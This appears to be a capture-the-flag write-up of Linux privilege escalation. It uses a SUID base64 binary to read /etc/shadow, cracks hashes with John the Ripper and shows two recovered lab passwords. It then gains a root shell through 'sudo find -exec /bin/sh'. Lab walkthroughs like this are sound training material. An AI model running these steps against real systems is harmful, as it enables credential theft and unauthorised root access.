RECON:

```jsx
cat /etc/passwd | grep home `(to list the user)`
uname -a  
cat /proc/version `(to check OS info)`
sudo -l   `(to check the sudos)`

```

![image](https://github.com/user-attachments/assets/0d9e9da3-e1ec-41c2-a78d-1482eaf09fc9)


checking suid 

```jsx
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -u=s -ls 2>/dev/null
```

![image](https://github.com/user-attachments/assets/c1563691-76ef-44f5-bd2a-55e3f7b5759f)


since we have base64 we can read files by setting LFILE as shown below

```jsx
LFILE=/etc/passwd
base64 "$LFILE" | base64 --decode

LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode

`copy the content to passwd.txt ad shadow.txt and use unshadow`

unshadow passwd.txt shadow.txt > passwords.txt

`now use passwords.txt file as an input for john to crack the password`

john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

passwords found:

Password1        (missy)

Penny123         (leonard)

![image](https://github.com/user-attachments/assets/188f95e6-8865-4562-bc86-9afc3e280557)


switch user:

```jsx
su missy
cd /home/missy/Documents
cat flag1.txt

```

![image](https://github.com/user-attachments/assets/5d3a6a57-4a02-4bfe-923d-4a25c10f8dfe)


For Missy user find sudos:

```jsx
sudo -l
sudo find . -exec /bin/sh \; -quit
cd /home/rootflag
cat flag2.txt
```

![image](https://github.com/user-attachments/assets/1002eda2-ead5-450c-8248-0460b91e535b)


other way:
![image](https://github.com/user-attachments/assets/9a113d36-4cdc-4e1d-97ad-7c0fbdb62dbc)
